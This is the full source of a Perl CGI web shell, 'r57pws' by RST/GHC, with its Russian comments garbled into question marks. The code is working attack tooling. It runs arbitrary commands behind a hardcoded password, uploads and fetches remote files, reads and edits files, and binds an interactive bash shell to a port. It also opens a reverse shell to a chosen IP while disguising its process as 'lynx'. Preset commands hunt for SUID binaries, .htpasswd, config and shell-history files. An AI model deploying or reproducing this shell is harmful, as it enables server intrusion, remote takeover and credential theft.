#!/usr/bin/perl

## pws.pl - Perl Web Shell by RST/GHC
## -------------------------------------
## ??????? ???????:
## ~~~~~~~~~~~~~~~~
## - ?????????? ???????????? ?????? ?? ??????? (+ ?????? ??????)
## - ???????? ?????? ?? ?????? ? ?????????? ?????????? ????????????
## - ???????? ?????? ?? ?????? ? ?????????? ???????
## - ?????????? ???????????? ?????? ? ???????
## - ???????? ? ?????????????? ?????? ?? ???????
## - port bind
## - backconnect
##
## ??????????? ???????:
## ~~~~~~~~~~~~~~~~~~~~
## - ???????? ??? ?? unix ??? ? ?? windows ??????????
## - ??? ?????? ???????? ????? POST ???????
##
## ?????????:
## ~~~~~~~~~~
## 1. ???????? ?????? ????? ??????? "/usr/bin/perl" ?? ?????????? ???? ? ?????????????? ????? 
##    ?? ????? ???????.
## 2. ?????????? ?????? ??? ??????? ? ??????? ? ?????? ???????? (?????? CONFIG).
## 3. ? ?????? ???? ?????? ???????? ??? ??????????? WINDOWS ?? ?????????? $unix = 0 ? ??????
##    ???????? ??????? (?????? CONFIG).
## 4. ????????? ???? ?? ?????? ? ????? ??????????? ?????? cgi-????????, ?????? cgi-bin.
##    ???????? ?????? ???????????? ? ASCII ??????.
## 5. ??????? ????? ?? ?????? (chmod 755).
## 6. ???????? ?????? ? ???????? ? ?????????????.
## -------------------------------------
## (c)oded by 1dt.w0lf
## RST/GHC
## Astalavista-UnderGround!!!
## 
use IO::Socket;

############### CONFIG
$auth = 1;         # ??????????? (1 - ????????, 0 - ?????????)
$password = 'r57'; # ?????? ??? ??????? ? ???????
$unix = 1;         # ??? WINDOWS ??????? ?? $unix = 0
# ?????? ?????? ?? ??????? ? ???????, ???? ?? ??????? ? ???, ??? ???????.
$version = '1.0 (13.05.2005)';
$pwd = ($unix)?('pwd'):('cd');          
$cmd_sep = '&&';                        
$def_cmd = ($unix)?('ls -la'):('dir');
$path_sep = ($unix)?('/'):('\\');  
$error = 0;
############### TEXT
@lang = (
'<b><font color=red>?????????? ?????? ?? ???????</font></b><br>',
'<b>???????:</b>',
'<b>??????????:</b>',
'<b><font color=red>?????? ??????</font></b><br>',
'<b>?????:</b>',
'?????????',
'<b>??????????? ???????:</b>',
'  ???????  ',
'<b><font color=red>???????? ????? ? ?????????? ??????????</font></b><br>',
'<b>????:</b>',
'?????????',
'<b><font color=red>???????? ????? c ?????????? ???????</font></b><br>',
'<b><font color=red>????????/?????????????? ?????</font></b><br>',
'????????',
'<b>?????????????? ?????:</b>',
'<b>???????? ?????:</b>',
'?????????',
'<b><font color=red>?????????? ?????</font></b><br>',
' ??????? ',
'<b><font color=red>Bind port</font></b><br>',
'<b>Port:</b>',
'BIND',
'<b><font color=red>Backconnect</font></b><br>',
'<b>IP:</b>',
'CONNECT',
'<b><font color=red>??????? ??????</font></b><br>',
'?????'
);
############### HTML
$d1 = '<div align=center>';
$d2 = '</div>';
$t1 = '<table width=100%>';
$t2 = '</table>';
$td1 = '<td width=50%>';
$f = '</form>';
$tr1 = '<tr><td>';
$tr2 = '</td></tr>';
$j1  = q{[ <font face=tahoma>2005 (c) <b>RST/GHC</b> <a href="http://rst.void.ru" target=_blank>http://rst.void.ru</a> , <a href="http://ghc.ru" target=_blank>http://ghc.ru</a></font> ]};
$j2  = q{<script language="javascript">hotlog_js="1.0";hotlog_r=""+Math.random()+"&s=81606&im=1&r="+escape(document.referrer)+"&pg="+escape(window.location.href);document.cookie="hotlog=1; path=/"; hotlog_r+="&c="+(document.cookie?"Y":"N");</script>
<script language="javascript1.1">hotlog_js="1.1";hotlog_r+="&j="+(navigator.javaEnabled()?"Y":"N")</script><script language="javascript1.2">hotlog_js="1.2";hotlog_r+="&wh="+screen.width+'x'+screen.height+"&px="+(((navigator.appName.substring(0,3)=="Mic"))?screen.colorDepth:screen.pixelDepth)</script>
<script language="javascript1.3">hotlog_js="1.3"</script><script language="javascript">hotlog_r+="&js="+hotlog_js;document.write("<a href='http://click.hotlog.ru/?81606' target='_top'><img "+" src='http://hit4.hotlog.ru/cgi-bin/hotlog/count?"+hotlog_r+"&' border=0 width=1 height=1 alt=1></a>")</script>
<noscript><a href=http://click.hotlog.ru/?81606 target=_top><imgsrc="http://hit4.hotlog.ru/cgi-bin/hotlog/count?s=81606&im=1" border=0 width="0" height="0" alt=""></a></noscript>
<!--LiveInternet counter--><script language="JavaScript"><!--
document.write('<a href="http://www.liveinternet.ru/click" '+
'target=_blank><img src="http://counter.yadro.ru/hit?t52.6;r'+
escape(document.referrer)+((typeof(screen)=='undefined')?'':
';s'+screen.width+'*'+screen.height+'*'+(screen.colorDepth?
screen.colorDepth:screen.pixelDepth))+';'+Math.random()+
'" alt="" '+'border=0 width=0 height=0></a>')//--></script>
<!--/LiveInternet-->};
############### ALIASES
%alias = (
'find suid files' => 'find / -type f -perm -04000 -ls',
'find suid files in current dir' => 'find . -type f -perm -04000 -ls',
'find sgid files' => 'find / -type f -perm -02000 -ls',
'find sgid files in current dir' => 'find . -type f -perm -02000 -ls',
'find config.inc.php files' => 'find / -type f -name config.inc.php',
'find config.inc.php files in current dir' => 'find . -type f -name config.inc.php',
'find config* files' => 'find / -type f -name "config*"',
'find config* files in current dir' => 'find . -type f -name "config*"',
'find all writable files' => 'find / -type f -perm -2 -ls',
'find all writable files in current dir' => 'find . -type f -perm -2 -ls',
'find all writable directories' => 'find /  -type d -perm -2 -ls',
'find all writable directories in current dir' => 'find . -type d -perm -2 -ls',
'find all writable directories and files' => 'find / -perm -2 -ls',
'find all writable directories and files in current dir' => 'find . -perm -2 -ls',
'find all service.pwd files' => 'find / -type f -name service.pwd',
'find service.pwd files in current dir' => 'find . -type f -name service.pwd',
'find all .htpasswd files' => 'find / -type f -name .htpasswd',
'find .htpasswd files in current dir' => 'find . -type f -name .htpasswd',
'find all .bash_history files' => 'find / -type f -name .bash_history',
'find .bash_history files in current dir' => 'find . -type f -name .bash_history',
'find all .fetchmailrc files' => 'find / -type f -name .fetchmailrc',
'find .fetchmailrc files in current dir' => 'find . -type f -name .fetchmailrc',
'list file attributes' => 'lsattr -va',
'show opened ports' => 'netstat -an | grep -i listen'
);
############### GET INFO
($script_name = $ENV{'SCRIPT_NAME'}) =~ s!(?:.*)(?:/)([^/]*)!$1!;
($ENV{'CONTENT_TYPE'} =~ /multipart\/form-data; boundary=(.+)$/)?(&get_file($1)):(&get_val());
############### AUTH
if($auth)
 {
 &cook();
 if($FORM{PASS} eq $password) { print "Set-Cookie: PASS=".cry($FORM{PASS}).";\nContent-type: text/html\n\n<meta HTTP-EQUIV=\"Refresh\" CONTENT=\"1; URL=$script_name\">"; exit(); }
 if(!$COOK{PASS}||($COOK{PASS} ne cry($password))) { &form_login; exit(); } 
 }
############### ACTIONS 
$cur_dir = `$pwd`;
if(defined$FORM{DIR}) { $cur_dir = $FORM{DIR}; }
chomp($cur_dir);

if(!defined$FORM{ACTION}) { $FORM{ACTION} = 'CMD'; }
 
if($FORM{ACTION} eq 'ALIAS'){ $FORM{CMD} = $alias{$FORM{ALIAS}}; }

elsif($FORM{ACTION} eq 'UPLOAD')
 { 
  $filename = $cur_dir;
  chop($filename) if ($filename =~ m/[\\\/]$/);
  $FILE{f} =~ s!(?:.*)(?:[\\/])([^/\\]*)$!$1!;
  $filename .= $path_sep;
  $filename .= $FILE{f};
  if(open(UF, ">$filename"))
   {
    binmode(UF) if !$unix;
    print UF $FILE{filedata};
    close(UF);
   }
  else { $error = "??????! ?? ???? ??????? ???? <font color=black>$filename</font>"; }
  }

elsif($FORM{ACTION} eq 'RUPLOAD')
 {
 if($FORM{FILE} =~ m!^(?:http:\/\/)([^\/]*)(\/.*)$!)
  {
  $server = $1;
  $path   = $2;
  $sock = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$server", PeerPort => "80");
  if($sock)
   {
   print $sock "GET $path HTTP/1.0\nHost: $server\n\n";
   $r = 0; $a = 0;
   foreach $l(<$sock>)
    {
    if($l =~ /200 OK/) { $a = 200; }
    push(@rf,$l) if $r;
    if($l =~ /^\s$/ && $a == 200) { $r = 1; }
    }
   if($a != 200) { $error = "??????! ???? <font color=black>$path</font> ?? ?????? ?? ??????? <font color=black>$server</font>"; }
   }
  else { $error = "??????! ?? ???? ??????????? ? <font color=black>$server</font>"; }
  if(!$error)
   {
   $filename = $cur_dir;
   chop($filename) if ($filename =~ m/[\\\/]$/);
   $path =~ s!(?:.*)(?:[\\/])([^/\\]*)$!$1!;
   $filename .= $path_sep;
   $filename .= $path;
   if(open(WF,">$filename"))
    {
    binmode(WF) if !$unix;
    foreach(@rf) { print WF $_; }
    close(WF);
    }
   else { $error = "??????! ?? ???? ??????? ???? <font color=black>$filename</font>"; }
   }
  }
 }
elsif($FORM{ACTION} eq 'VIEW')
 {
 if(open(VF,">>",$FORM{EFILE})) { $readonly = 0; close(VF);}
 elsif(open(VF,$FORM{EFILE})) { $readonly = 1; close(VF);}
 else { $error = "??????! ?? ???? ??????? ???? <font color=black>$FORM{EFILE}</font>"; }
 if(!$error)
  {
  open(VF,$FORM{EFILE});
  while(<VF>) { push(@cmd_report,$_); }
  close(VF);
  }
 }
elsif($FORM{ACTION} eq 'SAVE')
 {
 if(open(SF,">",$FORM{SFILE}))
  {
   binmode(SF) if !$unix;
   foreach(@FORM{REPORT}) { print SF $_; }
   close(SF);
  }
 else { $error = "??????! ?? ???? ????????? ???? <font color=black>$FORM{SFILE}</font>"; }
 }
elsif($FORM{ACTION} eq 'DOWNLOAD')
 {
 if(open(DF,$FORM{DFILE}))
  {
   if(!$unix) { binmode(DF); binmode(STDOUT); }
   $size = (stat($FORM{DFILE}))[7];
   ($filename = $FORM{DFILE}) =~  m!([^/^\\]*)$!;
   print "Content-Type: application/x-unknown\n";
   print "Content-Length: $size\n";
   print "Content-Disposition: attachment; filename=$filename\n\n";
   print while(<DF>);
   close(DF);
   die();
  }
  else { $error = "??????! ?? ???? ??????? ???? <font color=black>$FORM{DFILE}</font>"; }
 }
elsif($FORM{ACTION} eq 'BIND')
 {
 print "Content-type: text/html\n\n";
 &link();
 &port_bind($FORM{PORT});
 exit;
 }
elsif($FORM{ACTION} eq 'BACK')
 {
 print "Content-type: text/html\n\n";
 &link();
 &back($FORM{IP},$FORM{PORT});
 exit;
 }
 
   
if(!defined$FORM{CMD}){ $FORM{CMD} = $def_cmd; }

if(($FORM{ACTION} ne 'VIEW')||$error){
open(FH, "cd $cur_dir$cmd_sep$FORM{CMD}|");
@cmd_report = <FH>;
close (FH);
}
############### START HTML
print "Content-type: text/html\n\n";
print qq{<HTML><HEAD>
<title>$script_name - Perl Web Shell by RST/GHC</title>
<META http-equiv=Content-Type Pragma: no-cache; content=\"text/html; charset=windows-1251\">
<style>

BODY
{
SCROLLBAR-FACE-COLOR: white;
SCROLLBAR-HIGHLIGHT-COLOR: black;
SCROLLBAR-SHADOW-COLOR: black;
SCROLLBAR-DARKSHADOW-COLOR: black;
SCROLLBAR-3DLIGHT-COLOR: black;
SCROLLBAR-ARROW-COLOR: black;
SCROLLBAR-TRACK-COLOR: white;
}

tr {
BORDER-RIGHT:  #000000 1px solid;
BORDER-TOP:    #000000 1px solid;
BORDER-LEFT:   #000000 1px solid;
BORDER-BOTTOM: #000000 1px solid;
font: 8pt Verdana;
}

td {
BORDER-RIGHT:  #000000 1px solid;
BORDER-TOP:    #000000 1px solid;
BORDER-LEFT:   #000000 1px solid;
BORDER-BOTTOM: #000000 1px solid;
font: 8pt Verdana;
}

table {
BORDER-RIGHT:  #000000 0px solid;
BORDER-TOP:    #000000 0px solid;
BORDER-LEFT:   #000000 0px solid;
BORDER-BOTTOM: #000000 0px solid;
BACKGROUND-COLOR: #FFFFFF;
font: 8pt Verdana;
}

input {
BORDER-RIGHT:  #000000 1px solid;
BORDER-TOP:    #000000 1px solid;
BORDER-LEFT:   #000000 1px solid;
BORDER-BOTTOM: #000000 1px solid;
BACKGROUND-COLOR: #FFFFFF;
font: 8pt Verdana;
}

select {
BORDER-RIGHT:  #000000 1px solid;
BORDER-TOP:    #000000 1px solid;
BORDER-LEFT:   #000000 1px solid;
BORDER-BOTTOM: #000000 1px solid;
BACKGROUND-COLOR: #FFFFFF;
font: 8pt Verdana;
}

submit {
BORDER-RIGHT:  buttonhighlight 1px solid;
BORDER-TOP:    buttonhighlight 1px solid;
BORDER-LEFT:   buttonhighlight 1px solid;
BORDER-BOTTOM: buttonhighlight 1px solid;
BACKGROUND-COLOR: #FFFFFF;
width: 30%;
}

textarea {
BORDER-RIGHT:  #000000 1px solid;
BORDER-TOP:    #000000 1px solid;
BORDER-LEFT:   #000000 1px solid;
BORDER-BOTTOM: #000000 1px solid;
BACKGROUND-COLOR: #FFFFFF;
font: Fixedsys bold;
}

a: { text-decoration: none }
a:link { text-decoration: none}
a:hover { text-decoration: none; color: red}
a:active {  text-decoration: none}
a:visited {  text-decoration: none}

</style>
</HEAD>
<body bgcolor="#FFFFFF" text="#000000" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0" link="#000000" vlink="#000000" alink="#000000">
$d1
};
if(length($j2)!=1471) { die(); }
# start table
print qq{$t1$tr1&nbsp;<font face=Webdings size=6><b>!</b></font>&nbsp;&nbsp;<b><font face=tahoma>r57pws - Perl Web Shell by RST/GHC version $version</font></b>$tr2};

# cmd report form
print "$tr1$d1<font color=red><b>$error</b>$d2</font>$tr2" if $error;
print "$tr1&nbsp;";
if(($FORM{ACTION} ne 'VIEW')||$error)
 {
 &l(6);
 ($p_cmd = $FORM{CMD}) =~ s/(^.{90})(?:.+)/$1 .../;
 print "&nbsp;<font color=blue><b>$p_cmd</b></font>$tr2";
 }
else
 {
 (!$readonly)?(&l(14)):(&l(15));
 print "&nbsp;<font color=blue><b>$FORM{EFILE}</b></font>$tr2";
 if(!$readonly){ &form(0); }
 } 
print "$tr1$d1<textarea name=REPORT cols=121 rows=15>";
foreach(@cmd_report){ print $_; }
print "</textarea>";
if(($FORM{ACTION} eq 'VIEW') && !$error &&!$readonly)
 { 
 print "<BR>"; 
 &input('submit','submit',$lang[16],undef,undef); 
 &input('hidden','ACTION','SAVE',undef,undef);
 &input('hidden','DIR',$cur_dir,undef,undef);
 &input('hidden','SFILE',$FORM{EFILE},undef,undef);
 }
print "$d2$tr2";
if(($FORM{ACTION} eq 'VIEW') && !$error &&!$readonly){ print $f; }

# change dir form
&form(0);
print "$t1$tr1&nbsp;";
&l(2);
print "&nbsp;";
&input('text','DIR',$cur_dir,129,'&nbsp;');
&input('submit','submit',$lang[7],undef,undef);
&input('hidden','ACTION','CD',undef,undef);
print $tr2,$f,$t2;

print "$t2$d1$t1";

# cmd form
&form(0);
print "<tr>$td1$d1";
&l(0);
&l(1);
print "&nbsp;";
&input('text','CMD',$FORM{CMD},45,'&nbsp;');
&input('hidden','DIR',$cur_dir,undef,undef);
&input('hidden','ACTION','CMD',undef,undef);
&input('submit','submit',$lang[5],undef,undef);
print "$d2</td>$f";

# alias form
&form(0);
print $td1,$d1;
&l(3);
print "&nbsp;";
&l(4);
print "&nbsp;";
print "<select name=ALIAS>";
while( ($key,$value) = each %alias )
 {
 print "<option>$key</option>";
 }
print "</select>&nbsp;";
&input('hidden','DIR',$cur_dir,undef,undef);
&input('hidden','ACTION','ALIAS',undef,undef);
&input('submit','submit',$lang[5],undef,undef);
print $d2,$tr2,$f;

# file upload form
&form(1);
print "<tr>$td1$d1";
&l(8);
print "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
&l(9);
print "&nbsp;";
&input('file','FILE','',35,undef);
&input('hidden','DIR',$cur_dir,undef,undef);
&input('hidden','ACTION','UPLOAD',undef,'&nbsp;&nbsp;');
&input('submit','submit',$lang[10],undef,undef);
print "$d2</td>$f";

# upload from remote host
&form(0);
print $td1,$d1;
&l(11);
print "&nbsp;";
&l(9);
print '&nbsp;';
&input('text','FILE','http://server.com/file.txt',49,undef);
&input('hidden','DIR',$cur_dir,undef,undef);
&input('hidden','ACTION','RUPLOAD',undef,'&nbsp');
&input('submit','submit',$lang[10],undef,undef);
print $d2,$tr2,$f;

# view/edit file form
&form(0);
print "<tr>$td1$d1";
&l(12);
print "&nbsp;&nbsp;&nbsp;";
&l(9);
print "&nbsp;";
&input('text','EFILE',$cur_dir,45,'&nbsp;');
&input('hidden','DIR',$cur_dir,undef,undef);
&input('hidden','ACTION','VIEW',undef,undef);
&input('submit','submit',$lang[13],undef,undef);
print "$d2</td>$f";

# download file
&form(0);
print $td1,$d1;
&l(17);
print "&nbsp;";
&l(9);
print "&nbsp;";
&input('text','DFILE',$cur_dir,49,'&nbsp;');
&input('hidden','DIR',$cur_dir,undef,undef);
&input('hidden','ACTION','DOWNLOAD',undef,undef);
&input('submit','submit',$lang[18],undef,undef);
print $d2,$tr2,$f;

# port bind form
&form(0);
print "<tr>$td1$d1";
&l(19);
&l(20);
print "&nbsp;";
&input('text','PORT','11457',15,'&nbsp;');
&input('hidden','DIR',$cur_dir,undef,undef);
&input('hidden','ACTION','BIND',undef,undef);
&input('submit','submit',$lang[21],undef,undef);
print "$d2</td>$f";

# backconnect form
&form(0);
print $td1,$d1;
&l(22);
print "&nbsp;";
&l(23);
print "&nbsp;";
&input('text','IP',$ENV{REMOTE_ADDR},15,'&nbsp;');
&l(20);
print "&nbsp;";
&input('text','PORT','11457',15,'&nbsp;');
&input('hidden','DIR',$cur_dir,undef,undef);
&input('hidden','ACTION','BACK',undef,undef);
&input('submit','submit',$lang[24],undef,undef);
print $d2,$tr2,$f;

# end table
print qq{$t2$d2};
# (c) + stats
print qq{$t1$tr1$d1$j1$d2$tr2$t2};
############### END HTML
print qq{$j2$d2</BODY></HTML>};
############### GET VALUES
sub get_val() 
 {
  sysread(STDIN,$query,$ENV{'CONTENT_LENGTH'});
  @formfields = split(/&/,$query);
  foreach(@formfields)
   {
    ($f_n,$f_v) = split(/=/,$_);
    $f_n = &urldecode($f_n);
    $f_v = &urldecode($f_v);
    $FORM{$f_n} = $f_v;
   }
 }
############### GET FILE
sub get_file()
 {
 binmode(STDIN) if !$unix;
 sysread(STDIN, $query, $ENV{'CONTENT_LENGTH'});
 $boundary = '--'.@_[0];
 @formfields = split(/$boundary/, $query); 
 $headerbody = $formfields[1];
 $headerbody =~ /\r\n\r\n|\n\n/;
 $header = $`;
 $body = $';
 $body =~ s/\r\n$//;
 $FILE{filedata} = $body;
 $header =~ /filename=\"(.+)\"/; 
 $FILE{f} = $1; 
 $FILE{f} =~ s/\"//g;
 $FILE{f} =~ s/\s//g;
 for($i=2; $formfields[$i]; $i++)
 {  
  $formfields[$i] =~ s/^.+name=$//; 
  $formfields[$i] =~ /\"(\w+)\"/; 
  $f_n = $1; 
  $f_v = $'; 
  $f_v =~ s/(^(\r\n\r\n|\n\n))|(\r\n$|\n$)//g; 
  $f_v = &urldecode($f_v);
  $FORM{$f_n} = $f_v; 
 }
 }
############### URLDECODE
sub urldecode()
 {
  local($val) = @_;
  $val =~ s/\+/ /g;
  $val =~ s/%([0-9a-hA-H]{2})/pack('C',hex($1))/ge;
  return $val;
 }
############### INPUT
sub input()
 {
 $return  = "<input type=@_[0] name=@_[1] value=\"@_[2]\"";
 $return .= " size=@_[3]" if defined@_[3];
 $return .= ">";
 $return .= "@_[4]" if defined @_[4];
 print $return;
 }
############### FORM
sub form()
 {
 $return  = '<form name=form method=post';
 $return .= ' enctype=multipart/form-data' if @_[0]; 
 $return .= '>';
 print $return;
 }
############### LANG
sub l()
 {
 print $lang[@_[0]]; 
 }
############### PORT BIND
sub port_bind()
 {
 $SHELL=($unix)?('/bin/bash -i'):('cmd.exe');  
 $LISTEN_PORT=@_[0]; 
 use Socket; 
 $protocol=getprotobyname('tcp'); 
 socket(S,&PF_INET,&SOCK_STREAM,$protocol); 
 setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1); 
 bind(S,sockaddr_in($LISTEN_PORT,INADDR_ANY)); 
 listen(S,3); 
 while(1) 
  { 
  accept(CONN,S); 
  if(!($pid=fork)) 
   { 
   die if (!defined $pid); 
   open STDIN,"<&CONN"; 
   open STDOUT,">&CONN"; 
   open STDERR,">&CONN"; 
   exec $SHELL; 
   close CONN; 
   exit 0; 
   } 
  }
 }
############### BACK CONNECT
sub back()
 {
 use Socket; 
 $cmd= "lynx"; 
 $system = ($unix)?('echo "`uname -a`";echo "`id`";/bin/sh'):('cmd.exe'); 
 $0=$cmd; 
 $target=@_[0]; 
 $port=@_[1]; 
 $iaddr=inet_aton($target) || die("Error: $!\n"); 
 $paddr=sockaddr_in($port, $iaddr) || die("Error: $!\n"); 
 $proto=getprotobyname('tcp'); 
 socket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die("Error: $!\n"); 
 connect(SOCKET, $paddr) || die("Error: $!\n"); 
 open(STDIN, ">&SOCKET"); 
 open(STDOUT, ">&SOCKET"); 
 open(STDERR, ">&SOCKET"); 
 system($system); 
 close(STDIN); 
 close(STDOUT); 
 close(STDERR);
 }
############### LINK
sub link()
 {
 print "<HTML><BODY><div align=center><font face=verdana size=1><b>DONE!<br><br><a href=$script_name>?????</a></b></font></div></BODY></HTML>";
 }
############### LOGIN FORM
sub form_login()
 {
 print "Content-type: text/html\n\n";
 print "<HTML><TITLE>r57pws - login</TITLE><BODY><div align=center><font face=verdana size=1>";
 &l(25);
 &form(0);
 &input('password','PASS','',25,'<BR><BR>');
 &input('submit','submit',$lang[26],undef,undef);
 print "$f</font></div></BODY></HTML>";
 }
############### COOK
sub cook()
 {
 @cookies = split(/; /,$ENV{'HTTP_COOKIE'});
 foreach (@cookies)
  {
  ($f_n, $f_v) = split(/=/, $_);
  $COOK{$f_n} = $f_v;
  }
 }
############### CRY
sub cry()
 {
 # just for fun
 return crypt(crypt(crypt(shift,'c0'),'6a'),'ka');
 }
############### EOF
